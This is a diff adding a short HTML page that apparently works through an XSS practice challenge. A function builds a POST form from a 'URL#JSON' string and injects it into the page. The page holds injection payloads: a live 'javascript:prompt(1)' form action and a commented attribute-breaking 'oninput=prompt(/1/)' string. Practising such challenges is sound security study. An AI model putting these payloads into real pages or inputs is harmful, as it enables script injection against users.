@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script>
+        function escape() {
+            // var input = 'http://httpbin.org/post#{"name":"Matt"}';
+            // var input = 'http://httpbin.org/post" "oninput=prompt(/1/)#{"name":"Matt"}';
+            var input ='javascript:prompt(1)#{"action":1}';
+            // let's do a post redirectio
+            // pass in formURL#formDataJSON
+            // e.g. http://httpbin.org/post#{"name":"Matt"}
+            var segments = input.split('#');
+            var formURL = segments[0];
+            var formData = JSON.parse(segments[1]);
+
+            var form = document.createElement('form');
+            form.action = formURL;
+            form.method = 'post';
+            for (var i in formData) {
+                var input = form.appendChild(document.createElement('input'));
+                input.name = i;
+                input.setAttribute('value', formData[i]);
+            };
+            console.log(form.outerHTML);
+            return form.outerHTML;
+        }
+    </script>
+</head>
+
+<body onload='document.getElementById("body").innerHTML=escape();'>
+    <div id="body">
+    </div>
+    <!-- <form action="http://httpbin.org/" method="post"><input name="name" value="Matt"></form> -->
+    
+</body>
+
+</html>
